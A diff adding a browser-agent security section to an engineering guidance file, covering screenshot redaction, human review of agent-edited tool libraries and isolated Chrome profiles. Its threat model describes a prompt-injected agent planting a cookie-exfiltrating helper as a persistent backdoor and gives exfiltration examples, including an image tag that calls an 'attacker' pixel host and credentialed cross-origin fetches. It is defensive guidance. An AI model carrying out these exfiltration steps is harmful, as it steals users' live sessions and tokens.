@@ -356,6 +356,123 @@ This is security, not just FinOps. A compromised agent without caps = resource-e
 
 Each was preventable with one of the seven patterns above.
 
+## Browser Automation Security (2026)
+
+> Browser-driving agents (scraping, RPA, automated testing, onboarding, workflow automation) have **additional attack surface** that the 7 agentic-security MUSTs above don't fully cover. This section defines the **3 browser-specific patterns** that extend them. Activate when project profile is `browser-agent` or when the codebase uses `browser-use`, `browser-harness`, Playwright with LLM-driven arguments, or Anthropic Computer Use.
+
+### Threat model — what's different about browser agents
+
+A browser agent combines three dangerous capabilities by default:
+
+1. **Authenticated sessions** — often runs in a real logged-in Chrome profile (user's bank, email, SSO, work accounts)
+2. **Screenshot pipeline** — pages with sensitive content (password fields, 2FA codes, payment details, PII) get captured and sent to the LLM
+3. **Arbitrary JS execution** — `js("fetch('https://target.com/...', {credentials:'include'})")` runs with the user's cookies and CORS permissions
+
+The 7 MUST patterns cover the agent loop in general, but **none of them explicitly address screenshot content, cookie scoping, or user-profile isolation**. These 3 additional patterns close that gap.
+
+### The 3 MUST patterns for browser agents
+
+#### 1. Screenshot redaction + "never-credential-from-OCR" rule
+
+**Rule A — redact sensitive regions before the LLM sees them.**
+- Password input fields (`input[type=password]`)
+- 2FA code entry fields (heuristics: `input[autocomplete="one-time-code"]`, pattern matching `/^\d{6}$/` in narrow inputs)
+- Payment inputs (card number, CVV, expiry)
+- Any input with `autocomplete="cc-*"` or fields near "card", "CVV", "account number" labels
+- Visible API keys / tokens (string patterns on page: `sk-...`, `ghp_...`, `Bearer ...`)
+
+**Pattern (concept):**
+```typescript
+async function redactedScreenshot(page) {
+  await page.evaluate(() => {
+    document.querySelectorAll('input[type=password], input[autocomplete*=cc-], input[autocomplete=one-time-code]')
+      .forEach(el => el.style.visibility = 'hidden')
+  })
+  const img = await page.screenshot()
+  // Further: OCR-pass-and-redact for visible token patterns
+  return img
+}
+```
+
+**Rule B — NEVER submit credentials extracted from screenshot OCR.** If the agent's screenshot-to-text pass reads a password (because redaction failed, or the field was plain text), the agent **must refuse to type it back into another field**. This is the "auth wall" discipline: when the agent is redirected to a login, **stop and ask the user** — don't attempt to synthesize credentials.
+
+**Why both rules:** redaction is defense-in-depth. OCR may still catch things. The "never type credentials from OCR" rule is the hard stop.
+
+**Real risk:** `browser-use/browser-harness`'s SKILL.md explicitly says "don't type credentials from screenshots" — good discipline, but **not enforced by the library**. Your wrapper must enforce it.
+
+#### 2. Tool-mutation HITL (for agent-editable tool libraries)
+
+**Rule:** If your browser-agent architecture lets the agent **edit its own tool library mid-task** (the `browser-harness` / `helpers.py` / `helpers.ts` pattern), those edits go through **mandatory human PR review** before being committed to the shared tool library.
+
+**Why:** a prompt-injected agent can add `cookies_dump_to_http_post(url)` to `helpers.ts` and exfiltrate live session cookies to an attacker endpoint. The edit persists across future sessions — it's a **persistent backdoor**, not a one-shot payload. Agent-editable tools without HITL review is a supply-chain attack waiting to happen.
+
+**Acceptable patterns:**
+- ✅ Agent proposes a new primitive → opens PR → human reviews + merges → tool is available next session
+- ✅ Agent uses a tool mid-task as a **one-shot inline snippet** that doesn't persist
+- ❌ Agent silently commits to `helpers.ts` and continues
+
+**Enforcement:** tool-library files (`src/lib/browser/tools/**`, `helpers.ts`, `skills/*/SKILL.md`) are on a protected-file list. Edits trigger the `cdp-primitive-review` agent (defined in `profiles/browser-agent.yaml`) which classifies the change + flags suspicious patterns (cookie access, HTTP POST to external domains, `localStorage` enumeration).
+
+This extends **Pattern #5 (destructive-op HITL)** — agent-tool-mutation IS a destructive op even when it looks benign.
+
+#### 3. Isolated Chrome profile (never attach agent to user's primary)
+
+**Rule:** the browser agent runs in a **dedicated Chrome profile** with no login to user's bank, email, work SSO, crypto wallet, etc. Separate `--user-data-dir`, separate cookie jar, separate extension set.
+
+**Why:** the agent's JS execution (via `js()`, Playwright `page.evaluate`, CDP `Runtime.evaluate`) runs with the attached profile's cookies and CORS permissions. If the agent is attached to your primary Chrome profile, a prompt injection on Site A can:
+
+- Attempt `fetch('https://gmail.com/...', {credentials:'include'})` — SameSite cookies *usually* block this, but misconfigurations exist
+- Read `localStorage` / `sessionStorage` for tokens of other origins open in the same profile
+- Use `postMessage` cross-frame escape to reach other tabs
+- Exfiltrate via `<img src="https://attacker/pixel?data=...">` if CSP doesn't block
+
+Browser agents running locally should **always** use a separate profile. Cloud options (Browser Use Cloud, Browserbase, Steel.dev) default to isolated profiles.
+
+**Acceptable patterns:**
+- ✅ Dedicated Chrome profile with `--user-data-dir=/tmp/agent-profile-XYZ`
+- ✅ Containerized Chrome (Docker, Playwright Chrome image) with empty cookie jar
+- ✅ Cloud browser service with profile-per-session
+- ❌ `chrome --remote-debugging-port=9222` attached to the user's daily-driver Chrome window
+
+**Scaffolded projects:** `profiles/browser-agent.yaml` sets `BROWSER_PROFILE_DIR` env var pointing to `/tmp/bu-agent-<session>` by default; projects MUST NOT override to user's primary profile dir.
+
+### Nice-to-have (org scale)
+
+- **Domain allow-list enforcement** — agent can only navigate to domains in `BROWSER_HARNESS_ALLOWLIST`. Attempt to navigate elsewhere = hard stop. Prevents pivoting from authorized task to attacker site.
+- **Session time + action cap** — hard kill-switch via `BROWSER_MAX_SESSION_SEC` (default 300s) and max-tool-calls-per-session. Bounded blast radius even if agent is hijacked.
+- **Cookie scoping audit** — on session end, diff cookies-set-during-session against expected domains. Flags covert cookie plants.
+- **Egress filter on agent output** — markdown links/images to unknown domains stripped from agent-generated reports (same as Pattern #6 egress filter, but browser-output-specific).
+
+### Browser-security red flags
+
+- ❌ Agent attached to user's daily-driver Chrome profile
+- ❌ Screenshots sent to LLM without any redaction
+- ❌ `helpers.ts` / `helpers.py` edited by agent without HITL PR review
+- ❌ Agent can navigate to arbitrary URLs (no allow-list)
+- ❌ No session time limit — agent can loop forever
+- ❌ Raw `page.evaluate(userGeneratedJS)` — arbitrary JS from LLM runs with site cookies
+- ❌ Credentials typed back from OCR (agent tries to "log in for you" using screenshot contents)
+- ❌ Cookie data forwarded outside the session's origin (exfil channel)
+
+### Real 2025-2026 context
+
+browser-use (88k stars, Oct 2024 onward) is battle-tested but open-source defaults don't enforce these patterns — you wire them in. browser-harness (3.2k stars, 3 days old as of 2026-04-20) is explicitly an "anti-framework" that trusts the agent to self-extend. That's a valid philosophy **only if** patterns #2 and #3 above are enforced externally (PR review on tool-library edits + isolated Chrome profile).
+
+### Browser-security checklist (for `browser-agent` profile review)
+
+- [ ] Screenshots pass through redaction before LLM sees
+- [ ] Password fields explicitly hidden via CSS/JS before capture
+- [ ] "Never type credentials from OCR" rule enforced in agent system prompt
+- [ ] Tool-library files on protected-file list; edits require PR review
+- [ ] Agent uses dedicated `--user-data-dir`, not user's primary profile
+- [ ] `BROWSER_HARNESS_ALLOWLIST` env var set and enforced at navigation time
+- [ ] Session time limit set (`BROWSER_MAX_SESSION_SEC`)
+- [ ] `Runtime.evaluate` / `page.evaluate` calls have arg validation (no raw LLM-authored JS strings without schema)
+- [ ] Cookie scoping audited on session end
+- [ ] Markdown links/images in agent output stripped for unknown domains
+
+**Cross-reference:** this extends the 7 MUST agentic-security patterns above; it does not replace them. Browser agents must satisfy all 7 plus these 3.
+
 ## Secrets management
 
 - **Development:** `.env.local` (gitignored)
